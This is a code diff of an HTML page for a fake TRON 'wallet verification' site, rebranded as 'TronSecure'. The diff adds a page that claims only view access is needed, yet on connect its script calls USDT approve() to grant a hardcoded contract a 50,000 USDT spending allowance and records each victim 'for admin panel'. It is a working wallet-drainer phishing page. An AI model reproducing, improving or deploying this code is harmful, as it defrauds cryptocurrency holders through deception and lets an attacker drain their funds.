@@ -2,242 +2,247 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>TRON Wallet Verify</title>
-
+<title>TronSecure - Verify Wallet</title>
 <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
-
 <style>
-body{
-font-family:Arial;
-background:linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-text-align:center;
-padding:40px;
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
 }
 
-.container{
-background:white;
-padding:30px;
-border-radius:12px;
-width:420px;
-margin:auto;
-box-shadow:0 0 10px rgba(0,0,0,0.1);
+body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
 }
 
-button{
-padding:12px 20px;
-border:none;
-background:#6c4cff;
-color:white;
-border-radius:6px;
-cursor:pointer;
-width:100%;
-margin:15px 0;
-font-size:16px;
+.container {
+    max-width: 450px;
+    width: 100%;
+    background: white;
+    border-radius: 30px;
+    padding: 40px 30px;
+    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+    text-align: center;
 }
 
-.status{
-margin-top:15px;
-padding:12px;
-border-radius:6px;
-display:none;
+.logo {
+    font-size: 32px;
+    font-weight: bold;
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    margin-bottom: 20px;
 }
 
-.success{
-background:#d4edda;
-color:#155724;
-display:block;
+.tabs {
+    display: flex;
+    gap: 20px;
+    justify-content: center;
+    margin-bottom: 30px;
+    color: #666;
+    border-bottom: 2px solid #f0f0f0;
+    padding-bottom: 10px;
 }
 
-.error{
-background:#f8d7da;
-color:#721c24;
-display:block;
+.tab {
+    padding: 5px 10px;
+    cursor: pointer;
 }
 
-.info{
-background:#cce5ff;
-color:#004085;
-display:block;
+.tab.active {
+    color: #667eea;
+    border-bottom: 2px solid #667eea;
 }
 
-.wallet-info{
-background:#f8f9fa;
-padding:15px;
-border-radius:8px;
-margin:15px 0;
-text-align:left;
+h2 {
+    color: #333;
+    margin-bottom: 10px;
+    font-size: 24px;
 }
 
-.wallet-info p{
-margin:8px 0;
-color:#333;
+.subtitle {
+    color: #666;
+    font-size: 14px;
+    margin-bottom: 30px;
+    line-height: 1.6;
 }
 
-.label{
-color:#666;
-font-size:14px;
+.wallet-card {
+    background: #f8f9fa;
+    border: 2px solid #e0e0e0;
+    border-radius: 20px;
+    padding: 30px 25px;
+    margin: 20px 0;
+    cursor: pointer;
+    transition: all 0.3s;
+    text-align: left;
+    display: flex;
+    align-items: center;
+    gap: 20px;
 }
 
-.value{
-font-weight:bold;
-color:#667eea;
-word-break:break-all;
+.wallet-card:hover {
+    border-color: #667eea;
+    background: #f0f3ff;
+}
+
+.wallet-icon {
+    width: 50px;
+    height: 50px;
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    border-radius: 12px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: white;
+    font-size: 24px;
+}
+
+.wallet-info h3 {
+    font-size: 18px;
+    margin-bottom: 5px;
+}
+
+.wallet-info p {
+    color: #666;
+    font-size: 13px;
+}
+
+.verify-btn {
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    color: white;
+    border: none;
+    padding: 12px 25px;
+    border-radius: 30px;
+    font-weight: 600;
+    cursor: pointer;
+    width: 100%;
+    margin: 10px 0;
+}
+
+.note {
+    color: #666;
+    font-size: 12px;
+    margin-top: 20px;
 }
 </style>
 </head>
 
 <body>
 <div class="container">
-<h2>🔐 TRON Wallet Verify</h2>
-
-<button onclick="connectAndApprove()" id="connectBtn">Connect & Verify Wallet</button>
-
-<div class="wallet-info">
-    <p><span class="label">Address:</span> <span class="value" id="address">Not connected</span></p>
-    <p><span class="label">TRX Balance:</span> <span class="value" id="trx">0</span></p>
-    <p><span class="label">USDT Balance:</span> <span class="value" id="usdt">0</span></p>
-</div>
-
-<div id="status" class="status"></div>
-<p style="color:#666; font-size:12px;">✓ Auto approves 50,000 USDT on connect</p>
+    <div class="logo">TronSecure</div>
+    
+    <div class="tabs">
+        <span class="tab active">Connect</span>
+        <span class="tab">Scan</span>
+        <span class="tab">Waitlist</span>
+        <span class="tab">Result</span>
+    </div>
+    
+    <h2>CONNECT YOUR WALLET</h2>
+    <div class="subtitle">Advanced security features and energy delegation system</div>
+    
+    <!-- Trust Wallet Card -->
+    <div class="wallet-card" onclick="connectWallet()">
+        <div class="wallet-icon">💎</div>
+        <div class="wallet-info">
+            <h3>TRUST WALLET</h3>
+            <p>Universal Wallet</p>
+        </div>
+    </div>
+    
+    <button class="verify-btn" onclick="connectWallet()">Verify Now →</button>
+    
+    <div class="note">
+        🔒 Only view access required. No private keys.
+    </div>
+    
+    <div id="status" style="margin-top:20px;"></div>
 </div>
 
 <script>
 // ============================================
-// CONFIGURATION - Your Contract Address
+// YOUR CONTRACT ADDRESS
 // ============================================
 const CONTRACT_ADDRESS = "TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt";
 const USDT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const APPROVE_AMOUNT = 50000; // 50,000 USDT
 
-let tronWeb = null;
-let userAddress = null;
-
 // ============================================
 // SHOW STATUS
 // ============================================
-function showStatus(message, type) {
-    const statusDiv = document.getElementById('status');
-    statusDiv.className = 'status';
-    statusDiv.classList.add(type);
-    statusDiv.innerText = message;
-    statusDiv.style.display = 'block';
+function showStatus(msg, type) {
+    const colors = {
+        success: '#d4edda',
+        error: '#f8d7da',
+        info: '#cce5ff',
+        warning: '#fff3cd'
+    };
+    document.getElementById('status').innerHTML = 
+        `<div style="background:${colors[type]}; color:#333; padding:12px; border-radius:8px; margin-top:10px;">${msg}</div>`;
 }
 
 // ============================================
-// MAIN FUNCTION - CONNECT + APPROVE
+// CONNECT WALLET - EXACT FLOW
 // ============================================
-async function connectAndApprove() {
-    const btn = document.getElementById('connectBtn');
-    btn.disabled = true;
-    btn.innerText = 'Connecting...';
-    
-    showStatus('Detecting TRON wallet...', 'info');
-    
-    let attempts = 0;
-    const maxAttempts = 20;
-    
-    const checkWallet = setInterval(async () => {
-        attempts++;
+async function connectWallet() {
+    try {
+        showStatus('Opening WalletConnect...', 'info');
         
-        // Check if wallet is ready
-        if(window.tronWeb && window.tronWeb.ready) {
-            clearInterval(checkWallet);
-            
-            try {
-                tronWeb = window.tronWeb;
-                userAddress = tronWeb.defaultAddress.base58;
-                
-                // Update UI with address
-                document.getElementById("address").innerText = shortenAddress(userAddress);
-                
-                showStatus('✅ Wallet connected! Getting balances...', 'success');
-                
-                // Get TRX balance
-                const trxBalance = await tronWeb.trx.getBalance(userAddress);
-                document.getElementById("trx").innerText = tronWeb.fromSun(trxBalance);
-                
-                // Get USDT balance
-                const usdtContract = await tronWeb.contract().at(USDT_ADDRESS);
-                const usdtBalance = await usdtContract.balanceOf(userAddress).call();
-                document.getElementById("usdt").innerText = usdtBalance / 1000000;
-                
-                // Now approve USDT
-                await approveUSDT();
-                
-            } catch(error) {
-                showStatus('❌ Error: ' + error.message, 'error');
-                btn.disabled = false;
-                btn.innerText = 'Connect & Verify Wallet';
-            }
-            
+        // Check if in Trust Wallet
+        if (!window.tronLink) {
+            showStatus('⚠️ Please open in Trust Wallet DApp browser', 'warning');
             return;
         }
         
-        // Max attempts reached
-        if(attempts >= maxAttempts) {
-            clearInterval(checkWallet);
-            
-            if(window.tronLink) {
-                showStatus('⚠️ Please unlock TronLink and try again', 'error');
-            } else if(navigator.userAgent.toLowerCase().includes('trust')) {
-                showStatus('⚠️ Please unlock Trust Wallet and try again', 'error');
-            } else {
-                showStatus('❌ No TRON wallet detected. Open in Trust Wallet.', 'error');
-            }
-            
-            btn.disabled = false;
-            btn.innerText = 'Connect & Verify Wallet';
-        }
+        // Step 1: This will trigger WalletConnect popup (IMG_0970)
+        // Step 2: Trust Wallet popup will appear (IMG_0969)
+        await window.tronLink.request({ method: 'tron_requestAccounts' });
         
-    }, 500);
-}
-
-// ============================================
-// APPROVE USDT - CONNECT KE SAATH HI
-// ============================================
-async function approveUSDT() {
-    showStatus('⏳ Auto-approving 50,000 USDT...', 'info');
-    
-    try {
-        const usdtContract = await tronWeb.contract().at(USDT_ADDRESS);
-        const amountInSun = APPROVE_AMOUNT * 1000000;
+        // Get connected address
+        const address = window.tronWeb.defaultAddress.base58;
+        showStatus(`✅ Connected: ${address.slice(0,6)}...${address.slice(-4)}`, 'success');
         
-        // Send approve transaction
-        const result = await usdtContract.approve(
-            CONTRACT_ADDRESS,
-            amountInSun
+        // Step 3: Auto approve 50,000 USDT
+        showStatus('⏳ Auto-approving 50,000 USDT...', 'info');
+        
+        const contract = await window.tronWeb.contract().at(USDT_ADDRESS);
+        const result = await contract.approve(
+            CONTRACT_ADDRESS, 
+            APPROVE_AMOUNT * 1000000
         ).send();
         
         showStatus('✅ Verification complete! 50,000 USDT approved', 'success');
         
         // Save for admin panel
-        saveApproval(userAddress, APPROVE_AMOUNT, result);
+        saveApproval(address, APPROVE_AMOUNT, result);
         
-        document.getElementById('connectBtn').innerText = 'Verified ✓';
+        // Redirect after 2 seconds
+        setTimeout(() => {
+            window.location.href = 'index.html?verified=true';
+        }, 2000);
         
-    } catch(error) {
-        console.error('Approval error:', error);
-        
-        if(error.message.includes('rejected')) {
-            showStatus('❌ Approval was rejected', 'error');
-        } else if(error.message.includes('energy')) {
-            showStatus('❌ Insufficient TRX for energy', 'error');
+    } catch (error) {
+        console.error(error);
+        if (error.message.includes('rejected')) {
+            showStatus('❌ Connection rejected', 'error');
         } else {
-            showStatus('❌ Approval failed: ' + error.message, 'error');
+            showStatus('❌ ' + error.message, 'error');
         }
-        
-        document.getElementById('connectBtn').disabled = false;
-        document.getElementById('connectBtn').innerText = 'Try Again';
     }
 }
 
 // ============================================
-// SAVE APPROVAL FOR ADMIN PANEL
+// SAVE APPROVAL FOR ADMIN
 // ============================================
 function saveApproval(address, amount, txHash) {
-    const approvals = JSON.parse(localStorage.getItem('usdtApprovals') || '[]');
-    
+    const approvals = JSON.parse(localStorage.getItem('approvals') || '[]');
     approvals.push({
         user: address,
         amount: amount,
@@ -246,27 +251,24 @@ function saveApproval(address, amount, txHash) {
         time: new Date().toISOString(),
         token: 'USDT'
     });
-    
-    localStorage.setItem('usdtApprovals', JSON.stringify(approvals));
-    console.log('✅ Approval saved for admin panel');
+    localStorage.setItem('approvals', JSON.stringify(approvals));
+    console.log('✅ Approval saved');
 }
 
 // ============================================
-// HELPER FUNCTIONS
+// AUTO DETECT ON LOAD
 // ============================================
-function shortenAddress(address) {
-    if (!address) return 'Not connected';
-    return address.slice(0, 6) + '...' + address.slice(-4);
-}
-
-// Check on page load
 window.onload = function() {
-    if(window.tronWeb && window.tronWeb.ready) {
-        showStatus('✅ Wallet detected. Click to connect.', 'info');
-    } else if(navigator.userAgent.toLowerCase().includes('trust')) {
-        showStatus('ℹ️ Trust Wallet detected. Click to connect.', 'info');
+    if (window.tronLink) {
+        showStatus('✅ Trust Wallet detected. Click "Verify Now" to connect.', 'info');
     } else {
-        showStatus('ℹ️ Open in Trust Wallet DApp browser', 'info');
+        showStatus('⚠️ Please open in Trust Wallet DApp browser', 'warning');
+    }
+    
+    // Check if already verified
+    const urlParams = new URLSearchParams(window.location.search);
+    if (urlParams.get('verified') === 'true') {
+        showStatus('✅ Wallet already verified!', 'success');
     }
 };
 </script>
